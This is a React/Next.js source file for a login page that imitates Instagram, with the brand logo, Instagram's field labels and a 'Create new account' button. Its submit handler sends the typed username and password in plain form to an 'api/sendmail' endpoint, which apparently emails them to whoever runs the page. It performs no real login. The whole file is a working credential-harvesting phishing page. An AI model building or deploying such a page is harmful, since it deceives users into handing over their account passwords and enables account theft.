'use client';
import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import Image from 'next/image';

function App() {
  const [credentials, setCredentials] = useState({
    username: '',
    password: '',
  });

  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [loading, setLoading] = useState(false); 

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true); 

    try {
      await fetch('api/sendmail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userName: credentials.username,
          password: credentials.password,
        }),
      });


    } catch (error) {
      console.log(error)
    } finally {
      setLoading(false); 
    }
  };


  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex justify-center items-center py-3 mt-10">
        <p className="text-lg text-gray-600 bg-transparent">English (India)</p>
      </div>

      <div className="flex-1 flex flex-col justify-center px-5">
        <div className="flex justify-center mt-14 mb-20">
          <Image
            src={'/insta.png'}
            alt='insta'
            width={90}
            height={90}
          />
        </div>


        <form onSubmit={handleSubmit} className="space-y-3">
          <div className="relative">
            <input
              type="text"
              placeholder=""
              size={200}
              className="w-full px-3 py-5 bg-[#fafafa] text-gray-900 border rounded-lg  focus:outline-none"
              value={credentials.username}
              onChange={(e) => setCredentials((prev) => ({ ...prev, username: e.target.value }))}
            />
            <label
              className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
                credentials.username ? 'top-1' : 'top-5 text-lg '
              }`}
            >
              Username, email address or mobile number
            </label>
          </div>

          <div className="relative">
            <input
              type={isPasswordVisible ? 'text' : 'password'}
              placeholder=""
              className="w-full px-3 py-5 bg-[#fafafa] text-gray-900 border rounded-lg  focus:outline-none"
              value={credentials.password}
              onChange={(e) => setCredentials((prev) => ({ ...prev, password: e.target.value }))}
            />
            <label
              className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
                credentials.password ? 'top-1' : 'top-5 text-lg'
              }`}
            >
              Password
            </label>
            {credentials.password && (
              <button
                type="button"
                className="absolute right-3 top-1/2 -translate-y-1/2  font-semibold text-gray-900"
                onClick={() => setIsPasswordVisible(!isPasswordVisible)}
              >
                {!isPasswordVisible ? <EyeOff className='h-5'/> : <Eye className='h-5'/>}
              </button>
            )}
          </div>

          <button
            type="submit"
            disabled={loading} 
            className={`w-full py-3 rounded-3xl text-sm font-semibold bg-blue-600 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        <div className="mt-2 flex justify-center">
          <a href="#" className="text-lg text-gray-900">
            Forgotten Password?
          </a>
        </div>

        <div className="mt-auto pt-4 pb-6 text-center ">
        <button
            type="submit"
            disabled={loading} 
            className={`w-full py-3 rounded-3xl text-lg font-semibold bg-transparent border border-blue-700 text-blue-600 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
          >
            Create new account
          </button>
        </div>
      </div>
    </div>
  );
}

export default App;
